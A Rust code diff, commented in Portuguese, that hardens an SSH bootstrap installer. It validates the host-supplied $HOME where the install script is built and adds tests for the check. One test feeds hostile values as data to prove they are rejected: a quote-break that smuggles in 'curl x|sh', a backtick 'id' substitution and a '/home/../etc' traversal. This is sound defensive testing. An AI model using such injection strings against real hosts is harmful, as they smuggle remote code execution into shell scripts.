@@ -71,7 +71,17 @@ pub fn script_de_instalacao(
     catalogo: &[Verbo],
     chave_pub: &str,
     home: &str,
-) -> String {
+) -> Result<String, String> {
+    // A validação mora AQUI, no ponto de USO, e não no chamador.
+    //
+    // A primeira versão validava em `instalar`, antes de chamar esta função. Funcionava — e o
+    // teste unitário do validador passava **mesmo com a linha do chamador apagada**: a defesa
+    // existia e nada provava que estava LIGADA. É a mesma forma que este repo já corrigiu
+    // antes (defesa duplicada em que não se sabe qual das duas atua).
+    //
+    // Com a checagem aqui, esquecê-la deixou de ser possível — quem quer o script passa por
+    // ela — e os testes desta função a exercitam de graça.
+    super::registro::valid_home_remoto(home)?;
     // Caminhos LITERAIS: nada de `$HOME` na linha do authorized_keys (ver `Sondagem::home`).
     let dir_usuario = format!("{}/.schematize", home.trim_end_matches('/'));
     let (dir, sudo) = match nivel {
@@ -83,7 +93,7 @@ pub fn script_de_instalacao(
     // A linha do authorized_keys. `restrict` liga todas as restrições de uma vez (sem
     // port-forward, sem agent-forward, sem X11, sem pty) — e é aditivo em versões futuras do
     // OpenSSH, ao contrário de listar `no-port-forwarding,no-agent-forwarding,…` à mão.
-    format!(
+    Ok(format!(
         r#"set -eu
 {sudo}mkdir -p '{dir}'
 {sudo}sh -c 'cat > "{dir}/ops-shell"' <<'__SCHEMATIZE_SHIM__'
@@ -124,7 +134,7 @@ mv "$TMP" "$AK"
 echo "SCHEMATIZE_BOOTSTRAP_OK"
 "#,
         shim = SHIM.trim_end(),
-    )
+    ))
 }
 
 /// Decide o nível a instalar a partir da sondagem, e explica a decisão.
@@ -183,7 +193,9 @@ pub fn instalar(conn: &rusqlite::Connection, p: &mut VpsProfile) -> Result<Relat
     }
 
     let pub_key = crate::sshkeys::export_public(&p.key_name)?;
-    let script = script_de_instalacao(nivel, &catalogo, pub_key.trim(), &sond.home);
+    // O `home` veio da SONDAGEM, isto é, do próprio host. Quem o valida é a própria
+    // `script_de_instalacao`, no ponto de uso — pra não dar pra esquecer.
+    let script = script_de_instalacao(nivel, &catalogo, pub_key.trim(), &sond.home)?;
     let out = super::exec::executar_interno(conn, p, &script, "bootstrap")?;
     if !out.stdout.contains("SCHEMATIZE_BOOTSTRAP_OK") {
         return Err(format!(
@@ -222,12 +234,26 @@ mod tests {
         vec![Verbo { nome: "deploy".into(), comando: "/srv/deploy.sh".into() }]
     }
 
+    /// O `$HOME` vem do HOST — é o único valor de fora que vira caminho neste script, e o
+    /// script é interpretado por um `sh` do outro lado. A checagem mora no ponto de uso, não
+    /// no chamador, justamente pra que este teste a exercite sem precisar de rede.
+    #[test]
+    fn home_hostil_nao_vira_script() {
+        for veneno in ["/home/d'; curl x|sh; echo '", "/home/d`id`", "/home/../etc", "rel/ativo"] {
+            let r = script_de_instalacao(Fronteira::OpsShellUsuario, &cat(), "k", veneno);
+            assert!(r.is_err(), "$HOME hostil virou script: {veneno:?}");
+        }
+        // E o legítimo segue produzindo script.
+        assert!(script_de_instalacao(Fronteira::OpsShellUsuario, &cat(), "k", "/home/d").is_ok());
+    }
+
     #[test]
     fn com_sudo_instala_no_sistema_com_dono_root() {
         let (nivel, notas) = decidir(&sond("sim", "sim", "nenhum", "nao"));
         assert_eq!(nivel, Fronteira::OpsShellRoot);
         assert!(notas.iter().any(|n| n.contains("dono root")));
-        let s = script_de_instalacao(nivel, &cat(), "ssh-ed25519 AAAA x@y", "/home/d");
+        let s = script_de_instalacao(nivel, &cat(), "ssh-ed25519 AAAA x@y", "/home/d")
+            .expect("$HOME de teste é válido");
         assert!(s.contains("sudo -n mkdir -p '/usr/local/lib/schematize'"));
     }
 
@@ -238,7 +264,8 @@ mod tests {
         assert_eq!(nivel, Fronteira::OpsShellUsuario);
         assert!(nivel.e_server_side(), "o sshd continua sendo quem recusa");
         assert!(notas.iter().any(|n| n.contains("não ganha shell")));
-        let s = script_de_instalacao(nivel, &cat(), "ssh-ed25519 AAAA x@y", "/home/deploy");
+        let s = script_de_instalacao(nivel, &cat(), "ssh-ed25519 AAAA x@y", "/home/deploy")
+            .expect("$HOME de teste é válido");
         // As LINHAS DE COMANDO não podem ter sudo (o texto do shim embutido menciona a
         // palavra nos comentários dele — por isso a checagem é por linha, não por substring).
         let comandos: Vec<&str> = s.lines().filter(|l| !l.trim_start().starts_with('#')).collect();
@@ -270,7 +297,8 @@ mod tests {
             &cat(),
             "ssh-ed25519 NOSSA x@y",
             "/home/d",
-        );
+        )
+        .expect("$HOME de teste é válido");
         assert!(s.contains("grep -v -F \"$PUB\""), "remove só a linha da PRÓPRIA chave");
         assert!(!s.contains("> \"$AK\"\n"), "nunca trunca o authorized_keys inteiro");
         assert!(s.contains(">> \"$TMP\""), "acrescenta num temporário, não sobrescreve");
@@ -281,7 +309,8 @@ mod tests {
     fn o_script_usa_heredoc_nao_expansivo() {
         // Sem as aspas no delimitador, um `$(...)` dentro do shim ou do catálogo executaria
         // no host durante a instalação.
-        let s = script_de_instalacao(Fronteira::OpsShellUsuario, &cat(), "k", "/home/d");
+        let s = script_de_instalacao(Fronteira::OpsShellUsuario, &cat(), "k", "/home/d")
+            .expect("$HOME de teste é válido");
         assert!(s.contains("<<'__SCHEMATIZE_SHIM__'"), "delimitador tem que estar entre aspas");
         assert!(s.contains("<<'__SCHEMATIZE_CAT__'"));
     }
@@ -293,7 +322,8 @@ mod tests {
             &cat(),
             "ssh-ed25519 AAAA x@y",
             "/home/d",
-        );
+        )
+        .expect("$HOME de teste é válido");
         assert!(s.contains("restrict,command="));
         assert!(s.contains("/usr/local/lib/schematize/ops-shell"));
         assert!(s.contains("SCHEMATIZE_BOOTSTRAP_OK"), "precisa confirmar que terminou");
@@ -305,7 +335,8 @@ mod tests {
             Verbo { nome: "deploy".into(), comando: "/srv/d.sh".into() },
             Verbo { nome: "status".into(), comando: "systemctl status app".into() },
         ];
-        let s = script_de_instalacao(Fronteira::OpsShellUsuario, &verbos, "k", "/home/d");
+        let s = script_de_instalacao(Fronteira::OpsShellUsuario, &verbos, "k", "/home/d")
+            .expect("$HOME de teste é válido");
         for v in &verbos {
             assert!(s.contains(&format!("{}\t{}", v.nome, v.comando)), "verbo {:?} sumiu", v.nome);
         }
